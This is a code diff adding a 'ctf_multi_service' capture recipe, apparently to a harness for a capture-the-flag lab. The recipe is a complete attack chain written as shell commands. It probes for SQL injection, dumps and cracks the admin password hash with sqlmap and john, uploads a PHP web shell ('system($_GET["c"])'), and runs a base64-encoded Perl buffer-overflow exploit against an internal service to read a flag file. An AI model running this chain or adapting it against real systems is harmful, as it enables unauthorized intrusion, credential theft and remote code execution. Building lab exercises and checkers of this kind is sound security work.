@@ -697,6 +697,52 @@ printf '%s\n' "$ssti_out" | grep -o 'uid=[0-9]*([a-z]*)'
 printf '%s\n' "$bof_out"
 printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | grep -q 'www-data' && printf '%s' "$ssti_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
     ),
+    "ctf_multi_service": CaptureRecipe(
+        # Subset of mbptl_ctf_full_chain -- same SQLi-to-webshell chain and
+        # same perl-based buffer-overflow exploit against mbptl-internal
+        # (172.18.0.3:31337, found the same way -- DNS doesn't resolve
+        # "mbptl-internal" from this container, only a /16 subnet port scan
+        # finds it), just without the mbptl-app SSTI pivot. See
+        # mbptl_ctf_full_chain's comment for the full story of both.
+        command=r"""title="cms_$(date +%s)"
+sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
+dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
+hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}')
+printf 'admin:%s\n' "$hash" > /tmp/cms_hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/cms_hash.txt >/dev/null 2>&1
+crack=$(john --show --format=raw-md5 /tmp/cms_hash.txt 2>/dev/null | head -1)
+pass=$(printf '%s' "$crack" | cut -d: -f2)
+jar=/tmp/cms_$$.cookies
+curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null
+curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null
+printf '<?php system($_GET["c"]); ?>' > /tmp/cms_shell.php
+curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/cms_shell.php;filename=cms_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null
+sleep 1
+sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1)
+shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1)
+shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"
+webshell_id=$(curl -sS -m 8 -G "$shell_url" --data-urlencode 'c=id')
+perl_src=$(cat <<'PERLEOF'
+use IO::Socket::INET;
+my $s = IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp",Timeout=>5) or die "connfail";
+my $banner; $s->recv($banner,4096);
+my $payload = ("A" x 136) . pack("Q<", 0x4006c6);
+print $s "$payload\n";
+select(undef,undef,undef,0.5);
+my $out; $s->recv($out,4096);
+print $s "id; cat /flag.txt\n";
+select(undef,undef,undef,1);
+my $out2; $s->recv($out2,4096);
+print "BOF:$out2";
+PERLEOF
+)
+enc=$(printf '%s' "$perl_src" | base64 | tr -d '\n')
+bof_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode "c=echo $enc | base64 -d | perl - 2>&1")
+printf '%s\n' "$sqli_out" | grep -oi 'sql syntax.*' | head -1
+printf '%s\n' "$webshell_id"
+printf '%s\n' "$bof_out"
+printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | grep -q 'www-data' && printf '%s' "$bof_out" | grep -q 'uid=65534' && printf '%s' "$bof_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
